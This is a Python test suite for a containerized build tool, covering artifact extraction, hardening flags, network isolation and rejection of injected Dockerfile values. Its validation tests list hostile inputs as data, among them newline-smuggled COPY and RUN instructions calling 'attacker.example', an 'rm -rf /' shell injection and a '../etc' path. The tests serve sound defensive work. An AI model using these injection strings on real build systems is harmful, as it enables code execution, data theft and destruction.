"""Tests for core.env.build — containerized build + artifact extraction.

Hermetic: build_image / export_rootfs / remove_labeled_images are
patched; the "exported rootfs" is planted on disk. The live path is
covered by the S5.3 smoke (a real make target through docker).
"""

from __future__ import annotations

import os
from types import SimpleNamespace
from unittest.mock import patch

from core.env.build import (
    HARDENED_TOOLCHAIN,
    SOFT_TOOLCHAIN,
    _elf_executables,
    _flag_prefix,
    containerized_build,
)
from core.env.spec import ToolchainSpec


def _plant_elf(path, executable=True):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b"\x7fELF" + b"\x00" * 12)
    if executable:
        os.chmod(path, 0o755)


class TestElfScan:
    def test_finds_executable_elfs_only(self, tmp_path):
        _plant_elf(tmp_path / "app")
        _plant_elf(tmp_path / "build" / "tool")
        _plant_elf(tmp_path / "not-exec", executable=False)
        (tmp_path / "script.sh").write_text("#!/bin/sh\n")
        os.chmod(tmp_path / "script.sh", 0o755)
        found = _elf_executables(tmp_path)
        assert set(found) == {"app", "build/tool"}

    def test_missing_root_is_empty(self, tmp_path):
        assert _elf_executables(tmp_path / "nope") == {}

    def test_directory_symlink_cycle_bounded(self, tmp_path):
        """Attacker-built rootfs shape: two in-tree self-links
        (loop -> . and up -> ..) — both survive tar extraction under
        filter="data" — must neither expand combinatorially nor
        surface out-of-tree entries. pathlib's ** follows directory
        symlinks on 3.10-3.12; the walk must never enter them on ANY
        supported interpreter."""
        _plant_elf(tmp_path / "src" / "app")
        (tmp_path / "src" / "loop").symlink_to(".")
        (tmp_path / "src" / "up").symlink_to("..")
        found = _elf_executables(tmp_path)
        assert set(found) == {"src/app"}

    def test_directory_symlink_out_of_tree_not_followed(self, tmp_path):
        outside = tmp_path / "outside"
        _plant_elf(outside / "toolchain-bin")
        root = tmp_path / "root"
        _plant_elf(root / "app")
        (root / "vendor").symlink_to(outside)
        found = _elf_executables(root)
        # The toolchain binary behind the symlinked dir must NOT be
        # misattributed as a repo build artifact.
        assert set(found) == {"app"}


class TestFlagPrefix:
    def test_none_is_empty(self):
        assert _flag_prefix(None) == ""

    def test_hardened_flags_injected(self):
        prefix = _flag_prefix(HARDENED_TOOLCHAIN)
        assert "-fstack-protector-strong" in prefix
        assert "-Wl,-z,relro,-z,now" in prefix
        assert prefix.startswith("CFLAGS=")

    def test_soft_flags_injected(self):
        prefix = _flag_prefix(SOFT_TOOLCHAIN)
        assert "-fno-stack-protector" in prefix
        assert "-Wl,-z,norelro" in prefix

    def test_debug_appends_g_once(self):
        tc = ToolchainSpec(cflags=("-O0",), debug=True)
        prefix = _flag_prefix(tc)
        assert prefix.count("-g") == 2  # CFLAGS and CXXFLAGS
        assert "CFLAGS='-O0 -g'" in prefix


def _fake_container_layer(rootfs_planter=None, build_ok=True):
    """Patch the three container seams; return the patch context list."""
    def fake_build_image(*, context_dir, tag, dockerfile_text, **kw):
        from pathlib import Path as _P
        fake_build_image.dockerfile = dockerfile_text
        fake_build_image.kwargs = kw
        # The context is a TemporaryDirectory gone by assertion time —
        # record what matters while it exists.
        fake_build_image.context_had_repo = (
            _P(context_dir) / "src" / "Makefile").is_file()
        return SimpleNamespace(ok=build_ok, stderr_tail="boom" if not build_ok else "")

    def fake_export_rootfs(image_ref, dest_dir, **kw):
        if rootfs_planter:
            rootfs_planter(dest_dir)
        return SimpleNamespace(ok=True)

    return [
        patch("core.container.build.build_image", fake_build_image),
        patch("core.container.export.export_rootfs", fake_export_rootfs),
        patch("core.container.lifecycle.remove_labeled_images",
              lambda *a, **k: None),
        patch("core.container.lifecycle.prune_labeled_dangling",
              lambda *a, **k: True),
    ], fake_build_image


class TestContainerizedBuild:
    def _repo(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Makefile").write_text("all:\n\tcc -o app main.c\n")
        (repo / "main.c").write_text("int main(void){return 0;}\n")
        return repo

    def test_success_extracts_artifacts(self, tmp_path):
        from pathlib import Path

        def planter(dest):
            _plant_elf(Path(dest) / "src" / "app")

        patches, fake_build = _fake_container_layer(planter)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                self._repo(tmp_path), "make",
                out_dir=tmp_path / "out")
        assert product.ok
        assert list(product.artifacts) == ["app"]
        assert product.artifacts["app"].is_file()
        assert "RUN make" in fake_build.dockerfile
        # the repo was copied into the context (not built in place)
        assert fake_build.context_had_repo

    def test_toolchain_flags_reach_the_run_line(self, tmp_path):
        patches, fake_build = _fake_container_layer(
            lambda d: _plant_elf(__import__("pathlib").Path(d) / "src" / "a"))
        with patches[0], patches[1], patches[2], patches[3]:
            containerized_build(
                self._repo(tmp_path), "make",
                out_dir=tmp_path / "out", toolchain=HARDENED_TOOLCHAIN)
        assert "RUN CFLAGS='" in fake_build.dockerfile
        assert "-fstack-protector-strong" in fake_build.dockerfile

    def test_build_failure_is_structured(self, tmp_path):
        patches, _ = _fake_container_layer(build_ok=False)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                self._repo(tmp_path), "make", out_dir=tmp_path / "out")
        assert not product.ok
        assert product.reason == "build_failed"
        assert "boom" in product.detail

    def test_no_artifacts_is_structured(self, tmp_path):
        patches, _ = _fake_container_layer(lambda d: None)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                self._repo(tmp_path), "make", out_dir=tmp_path / "out")
        assert not product.ok
        assert product.reason == "no_artifacts"

    def test_copy_failure_is_structured(self, tmp_path):
        patches, _ = _fake_container_layer()
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                tmp_path / "does-not-exist", "make",
                out_dir=tmp_path / "out")
        assert not product.ok
        assert product.reason == "copy_failed"


class TestSecurityHardening:
    def _repo(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Makefile").write_text("all:\n\tcc -o app main.c\n")
        (repo / "main.c").write_text("int main(void){return 0;}\n")
        return repo

    def test_untrusted_build_gets_no_network(self, tmp_path):
        """Adversarial-review finding: consent-to-build is not consent
        to egress — the RUN step must be network-isolated."""
        patches, fake_build = _fake_container_layer(
            lambda d: _plant_elf(__import__("pathlib").Path(d) / "src" / "a"))
        with patches[0], patches[1], patches[2], patches[3]:
            containerized_build(self._repo(tmp_path), "make",
                                out_dir=tmp_path / "out")
        assert fake_build.kwargs.get("network") == "none"

    def test_extracted_artifacts_lose_exec_and_setuid(self, tmp_path):
        from pathlib import Path as _P

        def planter(dest):
            target = _P(dest) / "src" / "app"
            _plant_elf(target)
            os.chmod(target, 0o4755)  # setuid + exec from the attacker

        patches, _ = _fake_container_layer(planter)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(self._repo(tmp_path), "make",
                                          out_dir=tmp_path / "out")
        mode = product.artifacts["app"].stat().st_mode & 0o7777
        assert mode == 0o444

    def test_dest_collision_disambiguated(self, tmp_path):
        from pathlib import Path as _P

        def planter(dest):
            _plant_elf(_P(dest) / "src" / "a" / "b")
            _plant_elf(_P(dest) / "src" / "a__b")

        patches, _ = _fake_container_layer(planter)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(self._repo(tmp_path), "make",
                                          out_dir=tmp_path / "out")
        paths = {str(p) for p in product.artifacts.values()}
        assert len(paths) == 2, "colliding rels must map to distinct files"

    def test_cleanup_runs_on_build_failure(self, tmp_path):
        from unittest.mock import MagicMock
        removed = MagicMock()
        patches, _ = _fake_container_layer(build_ok=False)
        with patches[0], patches[1], patches[3], \
             patch("core.container.lifecycle.remove_labeled_images",
                   removed):
            containerized_build(self._repo(tmp_path), "make",
                                out_dir=tmp_path / "out")
        removed.assert_called_once()
        assert removed.call_args.kwargs.get("tag_repo") == \
            "raptor-env-build"


class TestCacheAndProvenanceHardening:
    def _repo(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Makefile").write_text("all:\n\tcc -o app main.c\n")
        (repo / "main.c").write_text("int main(void){return 0;}\n")
        return repo

    def test_label_is_first_dockerfile_instruction(self, tmp_path):
        """Intermediate step images inherit config from their parent —
        LABEL-first is what scopes the dangling-cache prune."""
        patches, fake_build = _fake_container_layer(
            lambda d: _plant_elf(__import__("pathlib").Path(d) / "src" / "a"))
        with patches[0], patches[1], patches[2], patches[3]:
            containerized_build(self._repo(tmp_path), "make",
                                out_dir=tmp_path / "out")
        lines = fake_build.dockerfile.splitlines()
        assert lines[0].startswith("FROM ")
        assert lines[1].startswith("LABEL raptor-env-build.id=")

    def test_force_rm_requested(self, tmp_path):
        patches, fake_build = _fake_container_layer(
            lambda d: _plant_elf(__import__("pathlib").Path(d) / "src" / "a"))
        with patches[0], patches[1], patches[2], patches[3]:
            containerized_build(self._repo(tmp_path), "make",
                                out_dir=tmp_path / "out")
        assert fake_build.kwargs.get("force_rm") is True

    def test_dangling_prune_runs_on_failure_paths(self, tmp_path):
        from unittest.mock import MagicMock
        pruned = MagicMock(return_value=True)
        patches, _ = _fake_container_layer(build_ok=False)
        with patches[0], patches[1], patches[2], \
             patch("core.container.lifecycle.prune_labeled_dangling",
                   pruned):
            containerized_build(self._repo(tmp_path), "make",
                                out_dir=tmp_path / "out")
        pruned.assert_called_once()

    def test_checksums_recorded(self, tmp_path):
        from pathlib import Path as _P

        def planter(dest):
            _plant_elf(_P(dest) / "src" / "app")

        patches, _ = _fake_container_layer(planter)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(self._repo(tmp_path), "make",
                                          out_dir=tmp_path / "out")
        assert len(product.checksums["app"]) == 64


class TestCcEmission:
    def test_cc_cxx_reach_the_run_line(self):
        tc = ToolchainSpec(cc="afl-clang-fast", cxx="afl-clang-fast++")
        prefix = _flag_prefix(tc)
        assert "CC='afl-clang-fast'" in prefix
        assert "CXX='afl-clang-fast++'" in prefix

    def test_cc_precedes_flags(self):
        tc = ToolchainSpec(cc="afl-clang-fast", cflags=("-O1",))
        prefix = _flag_prefix(tc)
        assert prefix.index("CC=") < prefix.index("CFLAGS=")

    def test_afl_toolchain_constant(self):
        from core.env.build import AFL_BUILD_IMAGE, AFL_TOOLCHAIN
        prefix = _flag_prefix(AFL_TOOLCHAIN)
        assert "CC='afl-clang-fast'" in prefix
        assert "CXX='afl-clang-fast++'" in prefix
        assert "afl" in AFL_TOOLCHAIN.instrumentation
        # digest-pinned, not a floating alias
        assert "@sha256:" in AFL_BUILD_IMAGE

    def test_plain_toolchains_unaffected(self):
        # HARDENED/SOFT carry no cc — the prefix shape is unchanged
        assert _flag_prefix(HARDENED_TOOLCHAIN).startswith("CFLAGS=")


class TestKeepRootfs:
    def _repo(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Makefile").write_text("all:\n\tcc -o app main.c\n")
        (repo / "main.c").write_text("int main(void){return 0;}\n")
        return repo

    def test_success_keeps_rootfs_and_reports_it(self, tmp_path):
        from pathlib import Path as _P

        def planter(dest):
            _plant_elf(_P(dest) / "src" / "app")
            (_P(dest) / "usr").mkdir(parents=True, exist_ok=True)

        keep = tmp_path / "rootfs"
        patches, _ = _fake_container_layer(planter)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                self._repo(tmp_path), "make",
                out_dir=tmp_path / "out", keep_rootfs=keep)
        assert product.ok
        assert product.rootfs == keep
        assert (keep / "src" / "app").is_file()
        # extraction still produced the read-only host copies
        assert product.artifacts["app"].is_file()

    def test_failure_discards_partial_rootfs(self, tmp_path):
        from pathlib import Path as _P

        def planter(dest):
            # export "succeeded" but the build produced no ELF
            (_P(dest) / "src").mkdir(parents=True, exist_ok=True)

        keep = tmp_path / "rootfs"
        patches, _ = _fake_container_layer(planter)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                self._repo(tmp_path), "make",
                out_dir=tmp_path / "out", keep_rootfs=keep)
        assert not product.ok
        assert product.reason == "no_artifacts"
        assert product.rootfs is None
        assert not keep.exists()

    def test_build_failure_discards_rootfs_dir(self, tmp_path):
        keep = tmp_path / "rootfs"
        keep.mkdir()
        (keep / "stale").write_text("x")
        patches, _ = _fake_container_layer(build_ok=False)
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                self._repo(tmp_path), "make",
                out_dir=tmp_path / "out", keep_rootfs=keep)
        assert not product.ok
        assert not keep.exists()

    def test_default_call_has_no_rootfs(self, tmp_path):
        from pathlib import Path as _P
        patches, _ = _fake_container_layer(
            lambda d: _plant_elf(_P(d) / "src" / "app"))
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                self._repo(tmp_path), "make", out_dir=tmp_path / "out")
        assert product.ok
        assert product.rootfs is None


class TestRunEnvAndAuxBuilds:
    def _repo(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "Makefile").write_text("all:\n\tcc -o app main.c\n")
        (repo / "main.c").write_text("int main(void){return 0;}\n")
        return repo

    def test_run_env_reaches_the_run_line(self, tmp_path):
        from pathlib import Path as _P
        patches, fake_build = _fake_container_layer(
            lambda d: _plant_elf(_P(d) / "src" / "a"))
        with patches[0], patches[1], patches[2], patches[3]:
            containerized_build(
                self._repo(tmp_path), "make", out_dir=tmp_path / "out",
                run_env={"AFL_USE_ASAN": "1"})
        assert "RUN AFL_USE_ASAN='1' make" in fake_build.dockerfile

    def test_aux_build_stage_shape(self, tmp_path):
        from pathlib import Path as _P
        patches, fake_build = _fake_container_layer(
            lambda d: _plant_elf(_P(d) / "src" / "a"))
        with patches[0], patches[1], patches[2], patches[3]:
            containerized_build(
                self._repo(tmp_path), "make", out_dir=tmp_path / "out",
                aux_builds={"src-cmplog": {"AFL_LLVM_CMPLOG": "1"}})
        df = fake_build.dockerfile
        # aux copy happens BEFORE any build runs (pristine tree)
        assert df.index("COPY src /src-cmplog") < df.index("RUN ")
        assert "WORKDIR /src-cmplog" in df
        assert "RUN AFL_LLVM_CMPLOG='1' make" in df

    def test_hostile_run_env_refused(self, tmp_path):
        import pytest as _pytest
        patches, _ = _fake_container_layer()
        with patches[0], patches[1], patches[2], patches[3]:
            with _pytest.raises(ValueError):
                containerized_build(
                    self._repo(tmp_path), "make", out_dir=tmp_path / "out",
                    run_env={"X": "a' ; rm -rf / ; '"})

    def test_hostile_aux_name_refused(self, tmp_path):
        import pytest as _pytest
        patches, _ = _fake_container_layer()
        with patches[0], patches[1], patches[2], patches[3]:
            with _pytest.raises(ValueError):
                containerized_build(
                    self._repo(tmp_path), "make", out_dir=tmp_path / "out",
                    aux_builds={"../etc": {}})


class TestDockerfileValueValidation:
    """The generated Dockerfile is assembled from values that cross a
    trust boundary (detector/LLM-synthesised build commands, on-disk
    spec toolchains). A newline in any of them injects instructions —
    ``COPY --from=attacker/image`` (host-side image pull) or BuildKit
    ``RUN --network=default`` (restores the egress ``network="none"``
    denies) — so every such value is refused as a structured
    ``rejected_input`` failure before any container work starts."""

    def _repo(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir(exist_ok=True)  # helper is re-entered per hostile case
        (repo / "Makefile").write_text("all:\n\tcc -o app main.c\n")
        (repo / "main.c").write_text("int main(void){return 0;}\n")
        return repo

    def _build(self, tmp_path, **kw):
        patches, fake_build = _fake_container_layer()
        with patches[0], patches[1], patches[2], patches[3]:
            product = containerized_build(
                self._repo(tmp_path), kw.pop("command", "make"),
                out_dir=tmp_path / "out", **kw)
        return product, fake_build

    def test_golden_dockerfile_unchanged_for_legit_inputs(self, tmp_path):
        """Byte-compare the full generated Dockerfile for a multi-word
        command + toolchain + run_env + aux stage: validation must not
        alter the text the container layer receives."""
        from core.env.build import DEFAULT_BUILD_IMAGE
        patches, fake_build = _fake_container_layer()
        with patches[0], patches[1], patches[2], patches[3]:
            containerized_build(
                self._repo(tmp_path), "make -j2 all",
                out_dir=tmp_path / "out",
                toolchain=HARDENED_TOOLCHAIN,
                run_env={"AFL_USE_ASAN": "1"},
                aux_builds={"src-cmplog": {"AFL_LLVM_CMPLOG": "1"}})
        build_id = fake_build.kwargs["labels"]["raptor-env-build.id"]
        cflags = "-fstack-protector-strong -fPIE -D_FORTIFY_SOURCE=2 -O1"
        ldflags = "-Wl,-z,relro,-z,now -pie"
        flag_prefix = (
            f"CFLAGS='{cflags}' CXXFLAGS='{cflags}' LDFLAGS='{ldflags}' "
        )
        assert fake_build.dockerfile == (
            f"FROM {DEFAULT_BUILD_IMAGE}\n"
            f"LABEL raptor-env-build.id={build_id}\n"
            f"COPY src /src\n"
            f"COPY src /src-cmplog\n"
            f"WORKDIR /src\n"
            f"RUN AFL_USE_ASAN='1' {flag_prefix}make -j2 all\n"
            f"WORKDIR /src-cmplog\n"
            f"RUN AFL_LLVM_CMPLOG='1' {flag_prefix}make -j2 all\n"
        )

    def test_hostile_commands_rejected_structured(self, tmp_path):
        hostile = [
            # new-instruction injection: attacker image pull at build
            "make\nCOPY --from=attacker/image /etc/passwd /loot",
            # BuildKit egress restore on an injected step
            "make\nRUN --network=default curl attacker.example",
            "make\r\nRUN --network=default curl attacker.example",
            # RUN-flag escape (no env/flag prefix precedes the command)
            "--network=default make",
            # line continuation absorbs the next generated instruction
            "make \\",
            "make\x00",
        ]
        for command in hostile:
            product, fake_build = self._build(tmp_path, command=command)
            assert not product.ok, command
            assert product.reason == "rejected_input", command
            # refused BEFORE any container work
            assert not hasattr(fake_build, "dockerfile"), command

    def test_hostile_toolchain_rejected_structured(self, tmp_path):
        hostile = [
            ToolchainSpec(cc="gcc'\nCOPY --from=evil / /"),
            ToolchainSpec(cxx="g++' ; curl evil ; '"),
            ToolchainSpec(cflags=("-O2'\nRUN --network=default x",)),
            ToolchainSpec(ldflags=("-Wl,-z,now -pie' x '",)),  # space
        ]
        for tc in hostile:
            product, fake_build = self._build(tmp_path, toolchain=tc)
            assert not product.ok
            assert product.reason == "rejected_input"
            assert not hasattr(fake_build, "dockerfile")

    def test_hostile_base_image_rejected_structured(self, tmp_path):
        product, fake_build = self._build(
            tmp_path,
            base_image="gcc:13\nCOPY --from=attacker/image / /loot")
        assert not product.ok
        assert product.reason == "rejected_input"
        assert not hasattr(fake_build, "dockerfile")

    def test_module_toolchain_constants_pass_validation(self):
        from core.env.build import AFL_TOOLCHAIN
        for tc in (HARDENED_TOOLCHAIN, SOFT_TOOLCHAIN, AFL_TOOLCHAIN):
            assert _flag_prefix(tc)  # must not raise
